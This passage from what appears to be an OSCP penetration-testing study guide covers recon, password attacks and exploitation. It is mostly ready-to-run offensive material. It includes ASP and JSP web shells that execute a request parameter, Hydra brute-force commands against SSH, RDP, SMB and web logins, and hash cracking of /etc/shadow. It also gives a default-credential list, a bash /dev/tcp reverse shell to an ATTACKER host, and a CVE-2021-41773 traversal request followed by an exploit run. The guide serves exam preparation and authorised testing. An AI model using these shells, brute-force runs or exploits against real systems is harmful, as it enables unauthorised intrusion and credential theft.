p.StartInfo.RedirectStandardOutput=true;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
p.WaitForExit(); %>

# JSP:
<%@ page import="java.util.*,java.io.*"%>
<% Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
DataInputStream is=new DataInputStream(p.getInputStream());
String line=is.readLine();
while(line!=null){out.println(line);line=is.readLine();} %>
```

---

### Password Attack Payloads

```bash
# ═══ HYDRA ═══
# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
hydra -L users.txt -P passwords.txt ssh://TARGET_IP
hydra -l root -P rockyou.txt ssh://TARGET_IP -t 4 -V

# FTP
hydra -l admin -P rockyou.txt ftp://TARGET_IP

# HTTP Basic Auth
hydra -l admin -P rockyou.txt http-get://TARGET_IP/admin/

# HTTP POST Form
hydra -l admin -P rockyou.txt TARGET_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
hydra -l admin -P rockyou.txt TARGET_IP http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# RDP
hydra -l administrator -P rockyou.txt rdp://TARGET_IP

# SMB
hydra -l administrator -P rockyou.txt smb://TARGET_IP

# MySQL
hydra -l root -P rockyou.txt mysql://TARGET_IP

# SMTP
hydra -l user@target.com -P rockyou.txt smtp://TARGET_IP

# ═══ HASH CRACKING ═══
# Identify hash type first
hash-identifier
hashid "5f4dcc3b5aa765d61d8327deb882cf99"

# Hashcat
hashcat -m 0    hash.txt rockyou.txt    # MD5
hashcat -m 100  hash.txt rockyou.txt    # SHA1
hashcat -m 1800 hash.txt rockyou.txt    # sha512crypt ($6$)
hashcat -m 1000 hash.txt rockyou.txt    # NTLM
hashcat -m 3200 hash.txt rockyou.txt    # bcrypt
hashcat -m 1400 hash.txt rockyou.txt    # SHA-256
hashcat -m 500  hash.txt rockyou.txt    # md5crypt ($1$)
hashcat -m 1800 hash.txt rockyou.txt --show   # show cracked

# John the Ripper
john hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --format=NT
john hash.txt --format=md5crypt
john hash.txt --format=bcrypt
john --show hash.txt

# Crack /etc/shadow
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt

# ═══ DEFAULT CREDENTIALS (try on every login) ═══
admin:admin
admin:password
admin:admin123
admin:1234
admin:12345
admin:123456
admin:Password1
root:root
root:toor
root:password
administrator:password
administrator:admin
guest:guest
user:user
user:password
test:test
tomcat:tomcat
manager:manager
jenkins:jenkins
admin:(blank)
root:(blank)
```

---

## 📋 STEP 14: ATTACK SURFACE MAP TEMPLATE

```markdown
# ATTACK SURFACE MAP
================================
TARGET: 192.168.x.x / target.com
DATE: YYYY-MM-DD
================================

## PASSIVE RECON
-----------------
WHOIS:
  Registrar:
  Admin Email:
  Nameservers: ns1.target.com, ns2.target.com
  Creation Date:
  Organization:
  IP Range:

DNS:
  A Records:    [IPs]
  MX Records:   [mail servers]
  NS Records:   [nameservers]
  TXT Records:  [SPF, interesting strings]
  Zone Transfer: VULNERABLE / NOT VULNERABLE
  Subdomains:
    - admin.target.com   [IP: x.x.x.x]
    - dev.target.com     [IP: x.x.x.x]
    - mail.target.com    [IP: x.x.x.x]

Shodan:
  Exposed Ports: [list]
  Banners/Versions: [e.g., Apache 2.4.49]
  CVE Tags: [e.g., CVE-2021-41773]

TheHarvester:
  Emails:
    - john.smith@target.com
    - admin@target.com
  Username candidates: jsmith, john.smith, johnsmith

Google Dorks:
  /robots.txt findings:
  Sensitive files found:
  Error pages found:

## ACTIVE RECON
-----------------
Nmap Scan 1 (Quick):
  Open ports: 22, 80, 443, 445
  Services: SSH, HTTP, HTTPS, SMB

Nmap Scan 2 (All ports):
  Additional ports found: 8080, 2049, 6379

Nmap Scan 3 (Targeted):
  Port 22:  OpenSSH 7.2p2 Ubuntu
  Port 80:  Apache httpd 2.4.49
  Port 445: Windows 7 SP1 SMB
  Port 8080: Apache Tomcat 9.0.1

Nmap Scan 4 (UDP):
  Port 161/UDP: SNMP — community string: "public"

Nmap NSE Results:
  smb-vuln-ms17-010: VULNERABLE
  http-methods: PUT, DELETE allowed
  ftp-anon: Allowed

SMB Enum:
  Shares: [list accessible shares]
  Users: [list]

SNMP Walk:
  System: [OS info]
  Interfaces: [IPs]
  Software: [installed programs]

## VULNERABILITY SCAN
-----------------------
Nessus Critical:
  1. CVE-2021-41773 — Apache 2.4.49 — RCE
  2. MS17-010 — SMB — RCE

Nessus High:
  3. CVE-2019-0708 — RDP BlueKeep

Nikto Findings:
  - Apache/2.4.49 version exposed
  - PUT method allowed on /
  - /admin/ directory accessible
  - Directory listing on /backup/

## ATTACK VECTORS (Priority Order)
------------------------------------
1. CVE-2021-41773 — Apache RCE    — CRITICAL — HIGH confidence
2. MS17-010 EternalBlue — SMB RCE — CRITICAL — HIGH confidence
3. SNMP community string "public"  — MEDIUM   — Need more enum
4. Default creds on /admin/        — LOW      — Try admin:admin
5. SSH with captured creds         — MEDIUM   — Try harvested emails

## CREDENTIALS FOUND
---------------------
Email/username list: [from TheHarvester]
SNMP community strings: public, private
Passwords found: [from any source]
SSH keys found: [paths]

## NEXT STEPS (IG2 Exploitation)
-----------------------------------
Priority 1: searchsploit apache 2.4.49 → run exploit
Priority 2: searchsploit ms17-010 → run EternalBlue
Priority 3: snmpwalk deeper → extract more info
```

---

## ✅ STEP 15: MASTER CHECKLIST

### Passive Recon Checklist

```
WHOIS
[ ] whois target.com → note admin email, nameservers, org
[ ] whois IP → note organization, network range
[ ] Build username list from emails

DNS Enumeration
[ ] dig target.com ANY — all records
[ ] dig target.com MX — mail servers
[ ] dig target.com NS — nameservers
[ ] dig axfr @ns1.target.com target.com — zone transfer
[ ] dnsrecon -d target.com -t std — standard enum
[ ] dnsrecon -d target.com -t brt — brute force

Subdomain Enumeration
[ ] sublist3r -d target.com — passive
[ ] amass enum -passive -d target.com
[ ] findomain -t target.com
[ ] curl crt.sh API — certificate transparency
[ ] gobuster dns / dnsx — active brute force
[ ] Combine + deduplicate all results
[ ] httpx / dnsx to check which are alive

Network Path
[ ] traceroute target.com — map hops
[ ] mtr --report target.com — detailed path

OSINT Tools
[ ] Shodan: hostname:target.com — exposed services
[ ] Shodan: vuln:CVE-XXX — direct vuln check
[ ] Maltego: domain graph, email discovery
[ ] Recon-ng: automated OSINT modules
[ ] Censys.io — certificate + banner data

Google Dorks
[ ] site:target.com inurl:admin — admin panels
[ ] site:target.com filetype:sql/pdf/env — sensitive files
[ ] intitle:"index of" site:target.com — directory listing
[ ] site:target.com "PHP error" — error disclosure
[ ] robots.txt and sitemap.xml checked manually

TheHarvester
[ ] theHarvester -d target.com -b all — emails, subdomains
[ ] Username list built from emails
```

### Active Recon Checklist

```
Nmap Scans
[ ] Scan 1: nmap -sC -sV -oN quick.txt TARGET
[ ] Scan 2: nmap -p- --min-rate 5000 -oN allports.txt TARGET
[ ] Scan 3: nmap -sC -sV -p [ports] -oN targeted.txt TARGET
[ ] Scan 4: sudo nmap -sU --top-ports 200 -oN udp.txt TARGET

Nmap NSE
[ ] smb-vuln-ms17-010 checked (if 445 open)
[ ] http-methods checked (if 80/443 open)
[ ] ftp-anon checked (if 21 open)
[ ] snmp-info / snmp-brute (if 161/UDP open)
[ ] mysql-empty-password (if 3306 open)

Service Enumeration
[ ] SMB: enum4linux -a TARGET (if 445 open)
[ ] SMB: smbclient -L //TARGET (list shares)
[ ] SNMP: snmpwalk -c public -v2c TARGET
[ ] NFS: showmount -e TARGET (if 2049 open)
[ ] SMTP: smtp-user-enum (if 25 open)
[ ] LDAP: ldapsearch -x (if 389 open)
```

### Web Scanning Checklist

```
[ ] nikto -h http://TARGET — web vulnerability scan
[ ] gobuster dir — directory enumeration
[ ] Check robots.txt, sitemap.xml
[ ] Check for .git, .svn exposure
[ ] Check for backup files (.bak, .zip, .old)
[ ] WPScan (if WordPress detected)
[ ] Test for default credentials on all login pages
[ ] Burp Suite — manual web testing
```

### Vulnerability Scan Checklist

```
[ ] Nessus scan run — results reviewed
[ ] OpenVAS scan run — CVE list extracted
[ ] All Critical findings → searchsploit matched
[ ] All High findings → searchsploit matched
[ ] CVE list with searchsploit results ready
[ ] Exploits copied to working directory
[ ] Attack surface map complete
[ ] Priority order decided (RCE first, auth bypass second)
```

---

## 📌 STEP 16: QUICK REFERENCE CARD

### One-Command Recon Script

```bash
#!/bin/bash
# OSCP Quick Recon Script
TARGET=$1
mkdir -p recon/{passive,nmap,vuln}

echo "[*] Starting Passive Recon..."
whois $TARGET > recon/passive/whois.txt
dig $TARGET ANY > recon/passive/dns.txt
dig axfr @$(dig $TARGET NS +short | head -1) $TARGET > recon/passive/zone_transfer.txt
sublist3r -d $TARGET -o recon/passive/subdomains.txt 2>/dev/null
theHarvester -d $TARGET -b google,bing -f recon/passive/harvester 2>/dev/null

echo "[*] Starting Nmap Scans..."
nmap -sC -sV -oN recon/nmap/quick.txt $TARGET
nmap -p- --min-rate 5000 -oN recon/nmap/allports.txt $TARGET
sudo nmap -sU --top-ports 200 -oN recon/nmap/udp.txt $TARGET

echo "[*] Web Scanning..."
nikto -h http://$TARGET -o recon/vuln/nikto.txt
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o recon/vuln/gobuster.txt

echo "[*] Done! Results in ./recon/"
```

### Top Commands by Category

```bash
# WHOIS
whois target.com

# DNS — Zone Transfer
dig axfr @ns1.target.com target.com

# Subdomain
amass enum -d target.com

# Shodan
shodan search "hostname:target.com"

# Nmap 4 scans
nmap -sC -sV -oN quick.txt TARGET
nmap -p- --min-rate 5000 -oN all.txt TARGET
nmap -sC -sV -p [PORTS] -oN targeted.txt TARGET
sudo nmap -sU --top-ports 200 -oN udp.txt TARGET

# SMB
enum4linux -a TARGET
smbclient -L //TARGET -N

# Web
nikto -h http://TARGET
gobuster dir -u http://TARGET -w common.txt

# Exploit
searchsploit apache 2.4.49
searchsploit -m exploits/linux/webapps/50383.py

# Reverse shell
nc -nlvp 4444
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

### Priority Table — What to Try First

| Priority | Vulnerability | Example | Action |
|---|---|---|---|
| 🔴 1 | RCE / Remote Code Execution | Apache CVE, EternalBlue | Exploit immediately |
| 🔴 2 | Authentication Bypass | SQLi on login | Bypass → get access |
| 🟠 3 | Default Credentials | admin:admin on panel | Try all defaults |
| 🟠 4 | Unauth File Access | NFS, FTP anon, Redis | Mount/connect → read files |
| 🟡 5 | Information Disclosure | phpinfo, error pages | Extract config, creds |
| 🟡 6 | Outdated Software (no PoC) | Old nginx version | Research CVEs |
| 🟢 7 | Misconfigurations | Directory listing | Browse, download all |

---

## 🎓 STUDENT CHECK

> **"Nessus found CVE-2021-41773 on Apache 2.4.49 — do you run the exploit immediately or verify first?"**

**Always verify before running:**

```bash
# Step 1: Confirm exact Apache version in Nmap output
# Look for: Apache httpd 2.4.49

# Step 2: Verify it's Linux (CVE only works on Linux)
# Check Nmap OS detection output

# Step 3: Manual test first
curl -s --path-as-is http://TARGET_IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd

# Step 4: If /etc/passwd returned → confirmed vulnerable
# Now run the exploit:
searchsploit -m 50383
python3 50383.py TARGET_IP 80

# Step 5: Get reverse shell
# (Follow exploit instructions)
```

**Why verify first?**
- Wrong version → wasted time
- Different OS → exploit fails
- Manual check confirms impact BEFORE automation
- Saves 20-30 min on OSCP exam time

---


> 
> **Next: IG2 — Exploitation + Payload Generation + Post-Exploitation**
> 
> *"Enumerate more, exploit less blindly. The more you recon, the smoother the exploitation."*
